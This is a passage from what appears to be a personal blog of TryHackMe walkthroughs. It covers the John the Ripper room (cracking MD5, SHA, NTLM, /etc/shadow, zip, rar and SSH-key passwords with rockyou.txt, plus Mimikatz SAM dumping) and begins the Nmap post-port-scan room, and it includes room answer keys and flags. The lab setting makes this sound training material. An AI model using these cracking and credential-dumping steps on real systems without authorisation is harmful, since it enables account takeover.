know if there is a fast algorithm to find the solution in the first place.While this is an extremely interesting mathematical concept that proves fundamental to computing and cryptography, it is completely outside the scope of this room. But abstractly it means that the algorithm to hash the value will be “P” and can therefore be calculated reasonably. However an un-hashing algorithm would be “NP” and intractable to solve- meaning that it cannot be computed in a reasonable time using standard computers.\nWhere John Comes in…Even though the algorithm itself is not feasibly reversible. That doesn’t mean that cracking the hashes is impossible. If you have the hashed version of a password, for example- and you know the hashing algorithm- you can use that hashing algorithm to hash a large number of words, called a dictionary. You can then compare these hashes to the one you’re trying to crack, to see if any of them match. If they do, you now know what word corresponds to that hash- you’ve cracked it!\nThis process is called a dictionary attack and John the Ripper, or John as it’s commonly shortened to, is a tool to allow you to conduct fast brute force attacks on a large array of different hash types.\nTASK 2 - Setting Up John The RipperSetting Up John The RipperJohn the Ripper is supported on many different Operating Systems, not just Linux Distributions. As a note before we go through this, there are multiple versions of John, the standard “core” distribution, as well as multiple community editions- which extend the feature set of the original John distribution. The most popular of these distributions is the “Jumbo John”- which we will be using specific features of later.\nParrot, Kali and AttackBoxIf you’re using Parrot OS, Kali Linux or TryHackMe’s own AttackBox- you should already have Jumbo John installed. You can double check this by typing john into the terminal. You should be met with a usage guide for john, with the first line reading: “John the Ripper 1.9.0-jumbo-1” or similar with a different version number. If not, you can use sudo apt install john to install it.\nBlackarchIf you’re using Blackarch, or the Blackarch repositories you may or may not have Jumbo John installed, to check if you do, use the command pacman -Qe | grep &quot;john&quot; You should be met with an output similar to “john 1.9.0.jumbo1-5” or similar with a different version number. If you do not have it installed, you can simply use pacman -S john to install it.\nBuilding from Source for LinuxIf you wish to build the package from source to meet your system requirements, you can do this in five fairly straightforward steps. Further advice on the installation process and how to configure your build from source can be found here.\nUse git clone https://github.com/openwall/john -b bleeding-jumbo john to clone the jumbo johnrepository to your current workingThen cd john/src/ to change your current directory to where the source code is.Once you’re in this directory, use ./configure to check the required dependencies and options that have been configured.If you’re happy with this output, and have installed any required dependencies that are needed, use make -s clean &amp;&amp; make -sj4 to build a binary of john. This binary will be in the above run directory, which you can change to with cd ../runYou can test this binary using ./john --test\nTASK 3 - WordlistsWordlistsAs we explained in the first task, in order to dictionary attack hashes, you need a list of words that you can hash and compare, unsurprisingly this is called a wordlist. There are many different wordlists out there, a good collection to use can be found in the SecLists repository. There are a few places you can look for wordlists on your attacking system of choice, we will quickly run through where you can find them.\nParrot, Kali and AttackBoxOn Parrot, Kali and TryHackMe’s AttackBox- you can find a series of amazing wordlists in the /usr/share/wordlists directory.\nRockYouFor all of the tasks in this room, we will be using the infamous rockyou.txt wordlist- which is a very large common password wordlist, obtained from a data breach on a website called rockyou.com in 2009. If you are not using any of the above distributions, you can get the rockyou.txt wordlist from the SecLists repository under the /Passwords/Leaked-Databases subsection. You may need to extract it from .tar.gz format, using tar xvzf rockyou.txt.tar.gz.\nNow that we have our hash cracker and wordlists all set up, lets move onto some hash cracking!\nQuestions and Answer in this Task\nQuestion : What website was the rockyou.txt wordlist created from a breach on?\nAnswer: rockyou.com\n\nTASK 4 - Cracking Basic HashesCracking Basic HashesThere are multiple ways to use John the Ripper to crack simple hashes, we’re going to walk through a few, before moving on to cracking some ourselves.\nJohn Basic SyntaxThe basic syntax of John the Ripper commands is as follows. We will cover the specific options and modifiers used as we use them.john [options] [path to file]john - Invokes the John the Ripper program[path to file] - The file containing the hash you’re trying to crack, if it’s in the same directory you won’t need to name a path, just the file.\nAutomatic CrackingJohn has built-in features to detect what type of hash it’s being given, and to select appropriate rules and formats to crack it for you, this isn’t always the best idea as it can be unreliable- but if you can’t identify what hash type you’re working with and just want to try cracking it, it can be a good option! To do this we use the following syntax:\njohn --wordlist=[path to wordlist] [path to file]\n--wordlist= - Specifies using wordlist mode, reading from the file that you supply in the following path…\n[path to wordlist] - The path to the wordlist you’re using, as described in the previous task.\nExample Usage:\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash_to_crack.txt\nIdentifying HashesSometimes John won’t play nicely with automatically recognising and loading hashes, that’s okay! We’re able to use other tools to identify the hash, and then set john to use a specific format. There are multiple ways to do this, such as using an online hash identifier like this one. I like to use a tool called hash-identifier, a Python tool that is super easy to use and will tell you what different types of hashes the one you enter is likely to be, giving you more options if the first one fails.\nTo use hash-identifier, you can just pull the python file from gitlab using: wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py.Then simply launch it with python3 hash-id.py and then enter the hash you’re trying to identify- and it will give you possible formats!\nFormat-Specific CrackingOnce you have identified the hash that you’re dealing with, you can tell john to use it while cracking the provided hash using the following syntax:\njohn --format=[format] --wordlist=[path to wordlist] [path to file]\n--format= - This is the flag to tell John that you’re giving it a hash of a specific format, and to use the following format to crack it\n[format] - The format that the hash is in\nExample Usage:\njohn --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash_to_crack.txt\nA Note on Formats:\nWhen you are telling john to use formats, if you’re dealing with a standard hash type, e.g. md5 as in the example above, you have to prefix it with raw- to tell john you’re just dealing with a standard hash type, though this doesn’t always apply. To check if you need to add the prefix or not, you can list all of John’s formats using john --list=formats and either check manually, or grep for your hash type using something like john --list=formats | grep -iF &quot;md5&quot;.\nPracticalNow you know the syntax, modifiers and methods to crack basic hashes, try it yourself! Download the attached .txt files that\nDownload the Files*\nDownload Here\n\nQuestions and Answers of the TaskQ1. What type of hash is hash1.txt?Answer: We can check the hash type by using hash-id tool as we discusdded previosuly\n\nlaunch the tool using the command : python3 hash-id.py\ncopy the hash content from the file you have downloaded\nWe can see the hash type is md5:\n\n  \n\nso the answer is MD5\n\nQ2. What is the cracked value of hash1.txt?Answer:We can find the value of hash1.txt using John The Ripper\n\nuse the following command to crarck the hashjohn --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txtOUTPUT\nWe can see the cracked value of the hash1&#x2F;txt is : biscuit\nSo the Answer is biscuit\n\nQ3. What type of hash is hash2.txt?\n\nWe can again use hash-id tool as we did for Question 1\n\nso the Answer is sha1\n\nQ4. What is the cracked value of hash2.txt\n\nwe can use the john the ripper as we did in Question 2\nCommand: john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hash.txtReplace the hash value in hash.txt file\n\nso the Answer is kangeroo\n\nQ5. What type of hash is hash3.txt?\n\nuse hash-id tool to find the type of hash :\n\nso the answer is SHA256\n\nQ6. What is the cracked value of hash3.txt\n\nuse &#96;John The Ripper’ as we did in Question 2\nCommand : john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hash.txtreplace the hash value hash.txt file\nso the Answer is microphone\n\nNow for Q7 &amp; Q8 repeat the process as we did for the above QuestionsAnswers should be : Q7.Whirlpool &amp; Q8.colossal\nTASK 5 - Cracking Windows Authentication HashesCracking Windows HashesNow that we understand the basic syntax and usage of John the Ripper- lets move on to cracking something a little bit more difficult, something that you may even want to attempt if you’re on a real Penetration Test or Red Team engagement. Authentication hashes are the hashed versions of passwords that are stored by operating systems, it is sometimes possible to crack them using the brute-force methods that we’re using. To get your hands on these hashes, you must often already be a privileged user- so we will explain some of the hashes that we plan on cracking as we attempt them.\nNTHash &#x2F; NTLMNThash is the hash format that modern Windows Operating System machines will store user and service passwords in. It’s also commonly referred to as “NTLM” which references the previous version of Windows format for hashing passwords known as “LM”, thus “NT&#x2F;LM”.\nA little bit of history, the NT designation for Windows products originally meant “New Technology”, and was used- starting with Windows NT, to denote products that were not built up from the MS-DOS Operating System. Eventually, the “NT” line became the standard Operating System type to be released by Microsoft and the name was dropped, but it still lives on in the names of some Microsoft technologies. \nYou can acquire NTHash&#x2F;NTLM hashes by dumping the SAM database on a Windows machine, by using a tool like Mimikatz or from the Active Directory database: NTDS.dit. You may not have to crack the hash to continue privilege escalation- as you can often conduct a “pass the hash” attack instead, but sometimes hash cracking is a viable option if there is a weak password policy.\nPracticalNow that you know the theory behind it, see if you can use the techniques we practiced in the last task, and the knowledge of what type of hash this is to crack the ntlm.txt file!\nDownload the files Here\nQustions and Answers in the TaskQ1. What do we need to set the “format” flag to, in order to crack this?\n\nNT\n\nQ2. What is the cracked value of this password?\n\nwe can use John The Ripper to crack the given hash\nCommand : john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt /home/kali/Desktop/ntlm_1605054722641.txt\n\nso the Answer is mushroom\n\nTASK 6 - Cracking &#x2F;etc&#x2F;shadow HashesCracking Hashes from &#x2F;etc&#x2F;shadowThe &#x2F;etc&#x2F;shadow file is the file on Linux machines where password hashes are stored. It also stores other information, such as the date of last password change and password expiration information. It contains one entry per line for each user or user account of the system. This file is usually only accessible by the root user- so in order to get your hands on the hashes you must have sufficient privileges, but if you do- there is a chance that you will be able to crack some of the hashes.\nUnshadowingJohn can be very particular about the formats it needs data in to be able to work with it, for this reason- in order to crack /etc/shadow passwords, you must combine it with the /etc/passwd file in order for John to understand the data it’s being given. To do this, we use a tool built into the John suite of tools called unshadow. The basic syntax of unshadow is as follows:\nunshadow [path to passwd] [path to shadow]unshadow - Invokes the unshadow tool[path to passwd] - The file that contains the copy of the &#x2F;etc&#x2F;passwd file you’ve taken from the target machine[path to shadow] - The file that contains the copy of the &#x2F;etc&#x2F;shadow file you’ve taken from the target machine\nExample Usage:\n\nunshadow local_passwd local_shadow &gt; unshadowed.txt Note on the files\n\nWhen using unshadow, you can either use the entire /etc/passwd and /etc/shadow file- if youhave them available, or you can use the relevant line from each, for example:\n\nFILE 1 - local_passwdContains the /etc/passwd line for the root user:root:x:0:0::/root:/bin/bash\n\nFILE 2 - local_shadow Contains the /etc/shadow line for the root user: root:$6$2nwjN454g.dv4HN/$m9Z/r2xVfweYVkrr.v5Ft8Ws3/YYksfNwq96UL1FX0OJjY1L6l.DS3KEVsZ9rOVLB/ldTeEL/OIhJZ4GMFMGA0:18576::::::\n\n\nCrackingWe’re then able to feed the output from unshadow, in our example use case called “unshadowed.txt” directly into John. We should not need to specify a mode here as we have made the input specifically for John, however in some cases you will need to specify the format as we have done previously using: --format=sha512cryptjohn --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt\nPracticalNow, see if you can follow the process to crack the password hash of the root user that is provided in the “etchashes.txt” file. Good luck!Download the files Here\nQuestions and Answers of the taskQ1. What is the root password?A:\n\nWe can use John The Ripper Tool to crack the hash\nEnter the command : john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt /home/kali/Desktop/etc_hashes_1605054759028.txt\nAnswer : 1234\n\nTASK 7 - Single Crack ModeSingle Crack ModeSo far we’ve been using John’s wordlist mode to deal with brute forcing simple., and not so simple hashes. But John also has another mode, called Single Crack mode. In this mode, John uses only the information provided in the username, to try and work out possible passwords heuristically, by slightly changing the letters and numbers contained within the username.\nWord ManglingThe best way to show what Single Crack mode is,  and what word mangling is, is to actually go through an example:If we take the username: Markus\nSome possible passwords could be:\nMarkus1, Markus2, Markus3 (etc.)MArkus, MARkus, MARKus (etc.)Markus!, Markus$, Markus* (etc.)This technique is called word mangling. John is building it’s own dictionary based on the information that it has been fed and uses a set of rules called “mangling rules” which define how it can mutate the word it started with to generate a wordlist based off of relevant factors for the target you’re trying to crack. This is exploiting how poor passwords can be based off of information about the username, or the service they’re logging into.\nGECOSJohn’s implementation of word mangling also features compatibility with the Gecos fields of the UNIX operating system, and other UNIX-like operating systems such as Linux. So what are Gecos? Remember in the last task where we were looking at the entries of both /etc/shadow and /etc/passwd? Well if you look closely You can see that each field is seperated by a colon &quot;:&quot;. Each one of the fields that these records are split into are called Gecos fields. John can take information stored in those records, such as full name and home directory name to add in to the wordlist it generates when cracking /etc/shadow hashes with single crack mode.\nUsing Single Crack ModeTo use single crack mode, we use roughly the same syntax that we’ve used to so far, for example if we wanted to crack the password of the user named “Mike“, using single mode, we’d use:john --single --format=[format] [path to file]--single - This flag lets john know you want to use the single hash cracking mode.Example Usage:john --single --format=raw-sha256 hashes.txt\nA Note on File Formats in Single Crack Mode:\nIf you’re cracking hashes in single crack mode, you need to change the file format that you’re feeding john for it to understand what data to create a wordlist from. You do this by prepending the hash with the username that the hash belongs to, so according to the above example- we would change the file hashes.txt\n1234From:1efee03cdcb96d90ad48ccc7b8666033Tomike:1efee03cdcb96d90ad48ccc7b8666033\n\nPracticalNow you’re familiar with the Syntax for John’s single crack mode, download the attached hash and crack it, assuming that the user it belongs to is called “Joker”.\nQuestions and Answers in the taskQ1. What is Joker’s password?\n\nAnswer :\nwe can use John to crack the hash\nfirst we need determine what type of hash it is\nWe can do that by using hash-id tool\n\nnow we can specify the format as raw-md5 in john -Crack the hash by using  john --single --format=raw-md5 /home/kali/Desktop/ntlm_1605054722641.txt  Make sure you insert joker before the hash  The final hash should like this :  joker:7bf6d9bb82bed1302f331fc6b816aada\nCommand : john --single --format=raw-md5 /home/kali/Desktop/ntlm_1605054722641.txt\n\nTASK 8 - Custom RulesWhat are Custom Rules?As we journeyed through our exploration of what John can do in Single Crack Mode- you may have some ideas about what some good mangling patterns would be, or what patterns your passwords often use- that could be replicated with a certain mangling pattern. The good news is you can define your own sets of rules, which John will use to dynamically create passwords. This is especially useful when you know more information about the password structure of whatever your target is.\nCommon Custom RulesMany organisations will require a certain level of password complexity to try and combat dictionary attacks, meaning that if you create an account somewhere, go to create a password and enter:polopasswordYou may receive a prompt telling you that passwords have to contain at least one of the following:\n\nCapital letter\nNumber\nSymbolThis is good! However, we can exploit the fact that most users will be predictable in the location of these symbols. For the above criteria, many users will use something like the following:Polopassword1!\n\nA password with the capital letter first, and a number followed by a symbol at the end. This pattern of the familiar password, appended and prepended by modifiers (such as the capital letter or symbols) is a memorable pattern that people will use, and reuse when they create passwords. This pattern can let us exploit password complexity predictability.\nNow this does meet the password complexity requirements, however as an attacker we can exploit the fact we know the likely position of these added elements to create dynamic passwords from our wordlists.\nHow to create Custom RulesCustom rules are defined in the john.conf file, usually located in /etc/john/john.conf if you have installed John using a package manager or built from source with make and in /opt/john/john.conf on the TryHackMe Attackbox.\nLet’s go over the syntax of these custom rules, using the example above as our target pattern. Note that there is a massive level of granular control that you can define in these rules, I would suggest taking a look at the wiki here in order to get a full view of the types of modifier you can use, as well as more examples of rule implementation.\nThe first line:\n[List.Rules:THMRules] - Is used to define the name of your rule, this is what you will use to call your custom rule as a John argument.We then use a regex style pattern match to define where in the word will be modified, again- we will only cover the basic and most common modifiers here:\n123[Az] - Takes the word and appends it with the characters you define[A0] - Takes the word and prepends it with the characters you define[c] - Capitalises the character positionally\nThese can be used in combination to define where and what in the word you want to modify.\nLastly, we then need to define what characters should be appended, prepended or otherwise included, we do this by adding character sets in square brackets [ ] in the order they should be used. These directly follow the modifier patterns inside of double quotes “ “. Here are some common examples:\n12345678910111213[0-9] - Will include numbers 0-9[0] - Will include only the number 0[A-z] - Will include both upper and lowercase[A-Z] - Will include only uppercase letters[a-z] - Will include only lowercase letters[a] - Will include only a[!£$%@] - Will include the symbols !£$%@\nPutting this all together, in order to generate a wordlist from the rules that would match the example password “Polopassword1!” (assuming the word polopassword was in our wordlist) we would create a rule entry that looks like this:\n\n[List.Rules:PoloPassword]\ncAz&quot;[0-9] [!£$%@]&quot;\n\nIn order to:\n\nCapitalise the first  letter - c\n\nAppend to the end of the word - Az\n\nA number in the range 0-9 - [0-9]\n\nFollowed by a symbol that is one of [!£$%@]\n\n\nUsing Custom RulesWe could then call this custom rule as a John argument using the  --rule=PoloPassword flag.\nAs a full command: john --wordlist=[path to wordlist] --rule=PoloPassword [path to file]As a note I find it helpful to talk out the patterns if you’re writing a rule- as shown above, the same applies to writing RegEx patterns too.Jumbo John already comes with a large list of custom rules, which contain modifiers for use almost all cases. If you get stuck, try looking at those rules [around line 678] if your syntax isn’t working properly.\nNow, time for you to have a go!\nQuestions and Answers of this Task\nTASK 9 - Cracking Password Protected Zip FilesCracking a Password Protected Zip FileYes! You read that right. We can use John to crack the password on password protected Zip files. Again, we’re going to be using a separate part of the john suite of tools to convert the zip file into a format that John will understand, but for all intents and purposes, we’re going to be using the syntax that you’re already pretty familiar with by now.\nZip2JohnSimilarly to the unshadow tool that we used previously, we’re going to be using the zip2john tool to convert the zip file into a hash format that John is able to understand, and hopefully crack. The basic usage is like this:\n\nzip2john [options] [zip file] &gt; [output file]\n\n[options] - Allows you to pass specific checksum options to zip2john, this shouldn’t often be necessary\n\n‘[zip file]’ - The path to the zip file you wish to get the hash of\n\n‘&gt;’ - This is the output director, we’re using this to send the output from this file to the…\n\n‘[output file]’ - This is the file that will store the output from\n\n\nExample Usagezip2john zipfile.zip &gt; zip_hash.txt\nCrackingWe’re then able to take the file we output from zip2john in our example use case called “zip_hash.txt” and, as we did with unshadow, feed it directly into John as we have made the input specifically for it.\njohn --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt\nPracticalNow have a go at cracking the attached “secure” zip file!\n\nDownload Files Here\n\nQuestions and Answers in the taskQ1.What is the password for the secure.zip file?Answer: For this we need to extract the hash of the zip file using the command: zip2john secure_1605054835063.zip &gt; output_hash.txt Now the hash will be saved into output_hash.txt file now we can give to John to crack the Password using the following command: john --wordlist=/usr/share/wordlists/rockyou.txt output_hash.txt OUTPUT:  Answer: pass123Q2. What is the contents of the flag inside the zip file?Answer: THM&#123;w3ll_d0n3_h4sh_r0y4l&#125;\nTASK 10 - Cracking Password protected RAR ArchivesCracking a Password Protected RAR ArchiveWe can use a similar process to the one we used in the last task to obtain the password for rar archives. If you aren’t familiar, rar archives are compressed files created by the Winrar archive manager. Just like zip files they compress a wide variety of folders and files.\n*Rar2John8Almost identical to the zip2john tool that we just used, we’re going to use the rar2john tool to convert the rar file into a hash format that John is able to understand. The basic syntax is as follows:\nrar2john [rar file] &gt; [output file]rar2john - Invokes the rar2john tool[rar file] - The path to the rar file you wish to get the hash of&gt; - This is the output director, we’re using this to send the output from this file to the…[output file] - This is the file that will store the output fromExample Usage:rar2john rarfile.rar &gt; rar_hash.txt\nCrackingOnce again, we’re then able to take the file we output from rar2john in our example use case called “rar_hash.txt” and, as we did with zip2john we can feed it directly into John..john --wordlist=/usr/share/wordlists/rockyou.txt rar_hash.txt\nPracticalNow have a go at cracking the attached “secure” rar file!\n\nDownload Files Here\n\nQuestions and Answers in the TaskQ1. What is the password of secure.zip file ?Answer: For this we need to extract the hash of the RAR file using the command: rar2john secure_1605054844670.rar &gt; rar_hash.txt Now the hash will be saved into rar_hash.txt file now we can give to John to crack the Password using the following command: john --wordlist=/usr/share/wordlists/rockyou.txt rar_hash.txt OUTPUT:  Answer: password\nQ2 . What is the contents of the flag inside the zip file?Answer: THM&#123;r4r_4rch1ve5_th15_t1m3&#125;\nTASK 11 - Cracking SSH Keys with JohnCracking SSH Key PasswordsOkay, okay I hear you, no more file archives! Fine! Let’s explore one more use of John that comes up semi-frequently in CTF challenges. Using John to crack the SSH private key password of id_rsa files. Unless configured otherwise, you authenticate your SSH login using a password. However, you can configure key-based authentication, which lets you use your private key, id_rsa, as an authentication key to login to a remote machine over SSH. However, doing so will often require a password- here we will be using John to crack this password to allow authentication over SSH using the key.\nSSH2JohnWho could have guessed it, another conversion tool? Well, that’s what working with John is all about. As the name suggests ssh2john converts the id_rsa private key that you use to login to the SSH session into hash format that john can work with. Jokes aside, it’s another beautiful example of John’s versatility. The syntax is about what you’d expect. Note that if you don’t have ssh2john installed, you can use ssh2john.py, which is located in the /opt/john/ssh2john.py. If you’re doing this, replace the ssh2john command with python3 /opt/ssh2john.py or on Kali, python /usr/share/john/ssh2john.py.\n\nssh2john [id_rsa private key file] &gt; [output file]\nssh2john - Invokes the ssh2john too\n[id_rsa private key file] - The path to the id_rsa file you wish to get the hash of\n&gt; - This is the output director, we’re using this to send the output from this file to the…\n[output file] - This is the file that will store the output from\n\nExample Usage:\nssh2john id_rsa &gt; id_rsa_hash.txt\nCrackingFor the final time, we’re feeding the file we output from ssh2john, which in our example use case is called “id_rsa_hash.txt” and, as we did with rar2john we can use this seamlessly with John:john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash.txt\nPracticalNow I’d like you to crack the hash of the id_rsa file that’s attached to this task!\nQuestions and Answers of the TaskQ1. What is the SSH private key password?Answer: For this we need to extract the hash of the SSH_KEY file using the command: ssh2john id_rsa_1605800988509.id_rsa &gt; rsa.txt Now the hash will be saved into rsa.txt file now we can give to John to crack the Password using the following command: john --wordlist=/usr/share/wordlists/rockyou.txt rsa.txt OUTPUT:  Answer: mango\nTASK 12 - Further ReadingThank you for completing this room on John the Ripper! I hope you’ve learnt a lot along the way. I’m sure by now you understand the basic principles and the pattern that there is to using John with even the most obscure supported hashes. I’d recommend checking out the Openwall Wiki here for more information about using John, and advice, updates or news about the tool.\nThank You 💌Author : Satvik Shetty 🧑‍💻See you again in another writeup\n","slug":"THM/HASHING & CRACKING/John-The-Ripper","date":"2024-05-20T11:12:16.000Z","categories_index":"cybersecurity,THM,cryptography","tags_index":"tryhackme,cryptography,hashing","author_index":"Satvik"},{"id":"2fabf1408eddff0177ed3e3bbe3ade2f","title":"Nmap Post Port Scans","content":"TASK 1 - Introduction:This room is the last in the Nmap series (part of the Introduction to Network Security module). In this room, we focus on the steps that follow port-scanning: in particular, service detection, OS detection, Nmap scripting engine, and saving the scan results.\nNmap Live Host DiscoveryNmap Basic Port ScansNmap Advanced Port ScansNmap Post Port ScansIn the first room of this series, we have learned how Nmap can enumerate targets, discover live hosts, and use reverse-DNS to find interesting names. The second and third rooms of the series focused on the basic and advanced types of scans for network ports.\nIn the last room, as shown in the figure below, we focus on how Nmap can be used to:\nDetect versions of the running services (on all open ports)Detect the OS based on any signs revealed by the targetRun Nmap’s tracerouteRun select Nmap scriptsSave the scan results in various formats\nThis room will focus on these steps and how to execute them after the port scan.\nQuestions and Answers of the task:\nTASK 2 - Service Detection:Once Nmap discovers open ports, you can probe the available port to detect the running service. Further investigation of open ports is an essential piece of information as the pentester can use it to learn if there are any known vulnerabilities of the service. Join Vulnerabilities 101 to learn more about searching for vulnerable services.\nAdding -sV to your Nmap command will collect and determine service and version information for the open ports. You can control the intensity with --version-intensity LEVEL where the level ranges between 0, the lightest, and 9, the most complete. -sV --version-light has an intensity of 2, while -sV --version-all has an intensity of 9.\nIt is important to note that using -sV will force Nmap to proceed with the TCP 3-way handshake and establish the connection. The connection establishment is necessary because Nmap cannot discover the version without establishing a connection fully and communicating with the listening service. In other words, stealth SYN scan -sS is not possible when -sV option is chosen.\nThe console output below shows a simple Nmap stealth SYN scan with the -sV option. Adding the -sV option leads to a new column in the output showing the version for each detected service. For instance, in the case of TCP port 22 being open, instead of 22&#x2F;tcp open ssh, we obtain 22&#x2F;tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0). Notice that the SSH protocol is guessed as the service because TCP port 22 is open; Nmap didn’t need to connect to port 22 to confirm. However, -sV required connecting to this open port to grab the service banner and any version information it can get, such as nginx 1.6.2. Hence, unlike the service column, the version column is not a guess.\nPentester Terminal\n1234567891011121314151617pentester@TryHackMe$ sudo nmap -sV MACHINE_IPStarting Nmap 7.60 ( https://nmap.org ) at 2021-09-10 05:03 BSTNmap scan report for MACHINE_IPHost is up (0.0040s latency).Not shown: 995 closed portsPORT    STATE SERVICE VERSION22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)25/tcp  open  smtp    Postfix smtpd80/tcp  open  http    nginx 1.6.2110/tcp open  pop3    Dovecot pop3d111/tcp open  rpcbind 2-4 (RPC #100000)MAC Address: 02:A0:E7:B5:B6:C5 (Unknown)Service Info: Host:  debra2.thm.local; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 8.40 seconds\nNote that many Nmap options require root privileges. Unless you are running Nmap as root, you need to use sudo as in the example above.\nStart the VM. Once it is ready, open the terminal on the AttackBox to answer the following questions.\nQuestions and answers of the task\nTASK 3 - OS Detection and TraceRouteOS DetectionNmap can detect the Operating System (OS) based on its behaviour and any telltale signs in its responses. OS detection can be enabled using -O ; this is an uppercase O as in OS. In this example, we ran nmap -sS -O  MACHINE_IP on the AttackBox. Nmap detected the OS to be Linux 3.X, and then it guessed further that it was running kernel 3.13.\nPentester Terminal\n12345678910111213141516171819202122pentester@TryHackMe$ sudo nmap -sS -O  MACHINE_IPStarting Nmap 7.60 ( https://nmap.org ) at 2021-09-10 05:04 BSTNmap scan report for MACHINE_IPHost is up (0.00099s latency).Not shown: 994 closed portsPORT    STATE SERVICE22/tcp  open  ssh25/tcp  open  smtp80/tcp  open  http110/tcp open  pop3111/tcp open  rpcbind143/tcp open  imapMAC Address: 02:A0:E7:B5:B6:C5 (Unknown)Device type: general purposeRunning: Linux 3.XOS CPE: cpe:/o:linux:linux_kernel:3.13OS details: Linux 3.13Network Distance: 1 hopOS detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 3.91 seconds\nThe system that we scanned and attempted to detect its OS version is running kernel version 3.16. Nmap was able to make a close guess in this case. In another case, we scanned a Fedora Linux system with kernel 5.13.14; however, Nmap detected it as Linux 2.6.X. The good news is that Nmap detected the OS correctly; the not-so-good news is that the kernel version was wrong.\nThe OS detection is very convenient, but many factors might affect its accuracy. First and foremost, Nmap needs to find at least one open and one closed port on the target to make a reliable guess. Furthermore, the guest OS fingerprints might get distorted due to the rising use of virtualization and similar technologies. Therefore, always take the OS version with a grain of salt.\nTracerouteIf you want Nmap to find the routers between you and the target, just add --traceroute. In the following example, Nmap appended a traceroute to its scan results. Note that Nmap’s traceroute works slightly different than the traceroute command found on Linux and macOS or tracert found on MS Windows. Standard traceroute starts with a packet of low TTL (Time to Live) and keeps increasing until it reaches the target. Nmap’s traceroute starts with a packet of high TTL and keeps decreasing it.\nIn the following example, we executed nmap -sS --traceroute MACHINE_IP on the AttackBox. We can see that there are no routers&#x2F;hops between the two as they are connected directly.\nPentester Terminal\n1234567891011121314151617181920pentester@TryHackMe$ sudo nmap -sS --traceroute MACHINE_IPStarting Nmap 7.60 ( https://nmap.org ) at 2021-09-10 05:05 BSTNmap scan report for MACHINE_IPHost is up (0.0015s latency).Not shown: 994 closed portsPORT    STATE SERVICE22/tcp  open  ssh25/tcp  open  smtp80/tcp  open  http110/tcp open  pop3111/tcp open  rpcbind143/tcp open  imapMAC Address: 02:A0:E7:B5:B6:C5 (Unknown)TRACEROUTEHOP RTT     ADDRESS1   1.48 ms MACHINE_IPNmap done: 1 IP address (1 host up) scanned in 1.59 seconds\nIt is worth mentioning that many routers are configured not to send ICMP Time-to-Live exceeded, which would prevent us from discovering their IP addresses. For more information, visit the Active Reconnaissance room.\nQuestions and answers of this Task\nTASK -4 NMAP Scripting Engine[NSE]A script is a piece of code that does not need to be compiled. In other words, it remains in its original human-readable form and does not need to be converted to machine language. Many programs provide additional functionality via scripts; moreover, scripts make it possible to add custom functionality that did not exist via the built-in commands. Similarly, Nmap provides support for scripts using the Lua language. A part of Nmap, Nmap Scripting Engine (NSE) is a Lua interpreter that allows Nmap to execute Nmap scripts written in Lua language. However, we don’t need to learn Lua to make use of Nmap scripts.\nYour Nmap default installation can easily contain close to 600 scripts. Take a look at your Nmap installation folder. On the AttackBox, check the files at &#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts, and you will notice that there are hundreds of scripts conveniently named starting with the protocol they target. We listed all the scripts starting with the HTTP on the AttackBox in the console output below; we found around 130 scripts starting with http. With future updates, you can only expect the number of installed scripts to increase.\nPentester Terminal\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566pentester@AttackBox /usr/share/nmap/scripts# ls http*http-adobe-coldfusion-apsa1301.nse      http-passwd.nsehttp-affiliate-id.nse                   http-php-version.nsehttp-apache-negotiation.nse             http-phpmyadmin-dir-traversal.nsehttp-apache-server-status.nse           http-phpself-xss.nsehttp-aspnet-debug.nse                   http-proxy-brute.nsehttp-auth-finder.nse                    http-put.nsehttp-auth.nse                           http-qnap-nas-info.nsehttp-avaya-ipoffice-users.nse           http-referer-checker.nsehttp-awstatstotals-exec.nse             http-rfi-spider.nsehttp-axis2-dir-traversal.nse            http-robots.txt.nsehttp-backup-finder.nse                  http-robtex-reverse-ip.nsehttp-barracuda-dir-traversal.nse        http-robtex-shared-ns.nsehttp-brute.nse                          http-security-headers.nsehttp-cakephp-version.nse                http-server-header.nsehttp-chrono.nse                         http-shellshock.nsehttp-cisco-anyconnect.nse               http-sitemap-generator.nsehttp-coldfusion-subzero.nse             http-slowloris-check.nsehttp-comments-displayer.nse             http-slowloris.nsehttp-config-backup.nse                  http-sql-injection.nsehttp-cookie-flags.nse                   http-stored-xss.nsehttp-cors.nse                           http-svn-enum.nsehttp-cross-domain-policy.nse            http-svn-info.nsehttp-csrf.nse                           http-title.nsehttp-date.nse                           http-tplink-dir-traversal.nsehttp-default-accounts.nse               http-trace.nsehttp-devframework.nse                   http-traceroute.nsehttp-dlink-backdoor.nse                 http-unsafe-output-escaping.nsehttp-dombased-xss.nse                   http-useragent-tester.nsehttp-domino-enum-passwords.nse          http-userdir-enum.nsehttp-drupal-enum-users.nse              http-vhosts.nsehttp-drupal-enum.nse                    http-virustotal.nsehttp-enum.nse                           http-vlcstreamer-ls.nsehttp-errors.nse                         http-vmware-path-vuln.nsehttp-exif-spider.nse                    http-vuln-cve2006-3392.nsehttp-favicon.nse                        http-vuln-cve2009-3960.nsehttp-feed.nse                           http-vuln-cve2010-0738.nsehttp-fetch.nse                          http-vuln-cve2010-2861.nsehttp-fileupload-exploiter.nse           http-vuln-cve2011-3192.nsehttp-form-brute.nse                     http-vuln-cve2011-3368.nsehttp-form-fuzzer.nse                    http-vuln-cve2012-1823.nsehttp-frontpage-login.nse                http-vuln-cve2013-0156.nsehttp-generator.nse                      